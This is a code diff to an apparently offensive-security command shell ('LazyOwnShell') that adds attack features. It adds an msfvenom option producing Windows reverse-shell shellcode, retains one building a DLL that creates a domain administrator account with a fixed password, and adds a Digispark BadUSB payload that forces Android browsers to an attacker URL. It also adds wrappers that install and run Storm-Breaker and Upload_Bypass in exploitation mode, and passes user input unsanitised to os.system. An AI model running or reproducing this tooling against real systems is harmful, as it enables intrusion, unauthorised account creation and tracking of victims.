@@ -1749,7 +1749,8 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg("16: java/jsp_shell_reverse_tcp")
         print_msg("17: windows/meterpreter/reverse_tcp  (C - shikata_ga_nai)")
         print_msg("18: windows/x64/exec cmd='net user administrator P@s5w0rd123!'")
-        choice = input("Enter your choice (1-18): ").strip()
+        print_msg("19: windows/shell_reverse_tcp python shellcode")
+        choice = input("Enter your choice (1-19): ").strip()
 
         # Define payload commands
         commands = {
@@ -1779,6 +1780,9 @@ class LazyOwnShell(cmd2.Cmd):
             ),
             "18": (
                 "msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll"
+            ),
+            "19": (
+                f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" EXITFUNC=thread -b "\\x00\\x0d\\x0a" -f python > sessions/run.py'
             )
         }
 
@@ -8598,8 +8602,13 @@ class LazyOwnShell(cmd2.Cmd):
             print_error(f"rhost must be set{RESET}")
             return
         rhost = self.params["rhost"]
-        print_msg(f"Try... python3 modules/lazyseo.py http://{rhost}{RESET}")
-        os.system(f"python3 modules/lazyseo.py http://{rhost}")
+        if line:
+            rhost = line.strip()
+            print_msg(f"Try... python3 modules/lazyseo.py {rhost}{RESET}")
+            os.system(f"python3 modules/lazyseo.py {rhost}")            
+        else:
+            print_msg(f"Try... python3 modules/lazyseo.py http://{rhost}{RESET}")
+            os.system(f"python3 modules/lazyseo.py http://{rhost}")
         return
 
     def do_padbuster(self, line):   
@@ -8917,6 +8926,9 @@ class LazyOwnShell(cmd2.Cmd):
         lport = self.params["lport"]
         if not check_lport(lport):
             return
+        if line:
+            lport = line.strip()
+
         if not is_binary_present("ngrok"):
             print_warn("Installing ngrok")
             install = """
@@ -8931,7 +8943,7 @@ class LazyOwnShell(cmd2.Cmd):
             os.system(install)
             
             print_msg("visit https://dashboard.ngrok.com/get-started/your-authtoken to get your token")
-            token = input("    [!] Authenticate your ngrok agent with your Token:")
+            token = input("    [!] Authenticate your ngrok agent with your Token: ")
             install = "ngrok config add-authtoken"
             command = f"{install} {token}"
             print_msg(command)
@@ -13649,7 +13661,8 @@ class LazyOwnShell(cmd2.Cmd):
         if not is_binary_present("micronucleus"):
             print_warn("Micronucleus not found, installing...")
             os.system("sudo apt-get install -y micronucleus")
-        payload_type = input("    [!] Payload target (1: Windows, 2: Linux): ").strip() or '1'
+        payload_type = input("    [!] Payload target (1: Windows, 2: Linux, 3: Android): ").strip() or '1'
+
         if payload_type == '2': 
             p.onecmd("createrevshell")
             lhost = self.params["lhost"]
@@ -13757,11 +13770,59 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(upload_command)
             os.system(upload_command)
 
+        elif payload_type == '3':
+
+            lhost = self.params["lhost"]
+            lport = self.params["lport"]
+            path = os.getcwd()
+            if not check_lhost(lhost):
+                return
+            ino_file = "digispark_android.ino"
+            
+            
+            path = os.getcwd()
+            file = f"{path}/modules/{ino_file}"
+            if not is_exist(file):
+                return
+
+            with open(file, 'r') as f:
+                content = f.read()
+
+            payload = input(f"Enter url to force visit. to get one use:{GREEN} stormbreaker: " )
+            content = content.replace("{payload}", payload)
+            os.system(f"mkdir {path}/sessions/androidbrowser")
+            file_ino = f"{path}/sessions/androidbrowser/androidbrowser.ino"
+            with open(file_ino, 'w+') as f:
+                f.write(content)
+
+            if not is_exist(file_ino):
+                print_error("Error: androidbrowser.ino file was not created.")
+                return
+            else:
+                with open(file_ino, 'r') as f:
+                    content = f.read()
+                    if not content.strip():
+                        print_error("Error: androidbrowser.ino file is empty.")
+                        return
+
+            print_msg(f"Compiling the sketch {file_ino}...")
+            output_dir = f"{path}/sessions/androidbrowser"
+            compile_command = f"arduino-cli compile --fqbn digistump:avr:digispark-tiny {file_ino} --output-dir {output_dir}"
+            print_msg(compile_command)
+            os.system(compile_command)
+
+            hex_file_path = f"{path}/sessions/androidbrowser/androidbrowser.ino.hex" 
+            print_msg(f"Uploading the compiled file {hex_file_path} to Digispark...")
+            upload_command = f"micronucleus --run {hex_file_path}"
+            print_msg(upload_command)
+            os.system(upload_command)
+        
         else:
             print_error("Invalid payload target.")
             return    
-        print_msg("Upload completed.")                    
-        p.onecmd("nc")
+        print_msg("Upload completed.")
+        if not payload_type == '3':
+            p.onecmd("nc")
         return
 
     def do_username_anarchy(self, line):
@@ -15634,6 +15695,152 @@ class LazyOwnShell(cmd2.Cmd):
     
         return
 
+    def do_stormbreaker(self, line):
+        """
+        Command stormbreaker: Automates the installation and usage of Storm-Breaker for performing various network attacks.
+
+        This function performs the following tasks:
+        1. Clones and installs Storm-Breaker if not already installed.
+        2. Prompts the user for optional parameters and target configuration.
+        3. Executes Storm-Breaker to perform various attacks using the target configuration.
+
+        Args:
+            line (str): Optional argument for specifying additional Storm-Breaker options.
+
+        Returns:
+            None
+
+        Example:
+            stormbreaker --verbose
+        """
+
+        stormbreaker_repo = "https://github.com/ultrasecurity/Storm-Breaker"
+        stormbreaker_dir = os.path.join(os.getcwd(), "external/.exploit/Storm-Breaker")
+
+        if not os.path.exists(stormbreaker_dir):
+            print_msg("Cloning Storm-Breaker repository...")
+            os.system(f"git clone {stormbreaker_repo} {stormbreaker_dir}")
+            print_msg("Running installation script...")
+            os.system(f"cd {stormbreaker_dir} && sudo bash install.sh")
+            print_msg("Installing required Python dependencies...")
+            os.system(f"sudo python3 -m pip install -r {stormbreaker_dir}/requirements.txt")
+        else:
+            print_msg("Storm-Breaker is already installed, skipping setup.")
+
+        if not line:
+            verbose = input("    [?] Enable verbose mode? (yes/no, default 'no'): ").strip().lower() or "no"
+        else:
+            args = line.split()
+            verbose = "yes" if "--verbose" in args else "no"
+
+        verbose_option = "--verbose" if verbose == "yes" else ""
+        command = f"cd {stormbreaker_dir} && sudo python3 st.py {verbose_option}"
+
+        print_msg(f"Running Storm-Breaker: {command} you can run:{GREEN} ngrok 2525{RESET}")
+        os.system(command)
+        return
+
+    def do_upload_bypass(self, line):
+        """
+        Command upload_bypass: Automates the installation and execution of Upload_Bypass for performing file upload bypass tests.
+
+        This function performs the following tasks:
+        1. Clones and installs Upload_Bypass if not already installed.
+        2. Prompts the user for the type of execution mode (Detection, Exploitation, or Anti-Malware).
+        3. Prepares and executes the chosen mode based on user input: success message, forbidden extension, upload directory, and proxy settings.
+
+        Args:
+            line (str): Optional argument for specifying execution mode, request file, success message, forbidden extension, and other Upload_Bypass options.
+
+        Returns:
+            None
+
+        Example:
+            upload_bypass --detect --request_file test --success 'File uploaded successfully' --extension php --upload_dir /uploads --burp
+        """
+
+        upload_bypass_repo = "https://github.com/sAjibuu/Upload_Bypass.git"
+        upload_bypass_dir = os.path.join(os.getcwd(), "external/.exploit/Upload_Bypass")
+
+        if not os.path.exists(upload_bypass_dir):
+            print_msg("Cloning Upload_Bypass repository...")
+            os.system(f"git clone {upload_bypass_repo} {upload_bypass_dir}")
+            print_msg("Installing required dependencies...")
+            os.system(f"pip install -r {upload_bypass_dir}/requirements.txt")
+        else:
+            print_msg("Upload_Bypass already installed, skipping setup.")
+
+        print_msg("Choose execution mode:")
+        print("1. Detection mode")
+        print("2. Exploitation mode")
+        print("3. Anti-Malware mode")
+
+        mode_choice = input("Enter the number of the mode you want to use: ").strip()
+        if mode_choice == "1":
+            mode = "--detect"
+        elif mode_choice == "2":
+            mode = "--exploit"
+        elif mode_choice == "3":
+            mode = "--anti_malware"
+        else:
+            print_warn("Invalid mode choice. Aborting...")
+            return
+
+        request_file = get_users_dic()
+        success_message = input(f"    [?] Enter the success message for a file upload (default ''): ").strip() or ''
+        forbidden_extension = input(f"    [?] Enter the forbidden extension to test (default 'php'): ").strip() or 'php'
+        upload_dir = input(f"    [?] Enter the remote upload directory (default '/uploads'): ").strip() or '/uploads'
+
+        proxy_choice = input(f"    [?] Use Burp Suite proxy? (yes/no, default 'no'): ").strip().lower() or 'no'
+        proxy_option = "--burp_http" if proxy_choice == "yes" else ""
+
+        command = f"cd {upload_bypass_dir} && python3 {upload_bypass_dir}/upload_bypass.py -r {request_file} -s '{success_message}' -E {forbidden_extension} -D {upload_dir} {proxy_option} {mode} --insecure"
+
+        print_msg(f"Running Upload_Bypass with command: {command}")
+        os.system(command)
+        return
+
+    def do_hex_to_plaintext(self, line):
+        """
+        Converts hexadecimal data from a file to plain text.
+
+        Opens a text editor for the user to paste hexadecimal data into a file.
+        Then reads the file, processes the hexadecimal data, and writes the plain text to a new file.
+
+        Args:
+            line (str): Name of the file containing hexadecimal data (without extension).
+                        Defaults to 'request.txt' if not provided.
+
+        Returns:
+            None
+        """
+        if not line:
+            line = "request.txt"
+        line = line.strip()
+        file_request = f"sessions/{line}" 
+        
+        os.system(f"nano {file_request}")
+        
+        with open(file_request, 'r') as file:
+            hex_data = file.read()
+        
+        lines = hex_data.splitlines()
+        hex_values = []
+
+        for line in lines:
+            parts = line.split()
+            hex_values.extend(parts[1:])
+        hex_values = [byte for byte in hex_values if len(byte) == 2]
+
+        plaintext = ''.join(chr(int(byte, 16)) for byte in hex_values if all(c in '0123456789abcdefABCDEF' for c in byte))
+       
+        print_msg("Plain text:")
+        file_plain = "sessions/request_plaintext.txt"
+        with open(file_plain, 'w') as plain:
+            plain.write(plaintext)
+        
+        print_msg(plaintext)
+        return
 
 if __name__ == "__main__":
     p = LazyOwnShell()
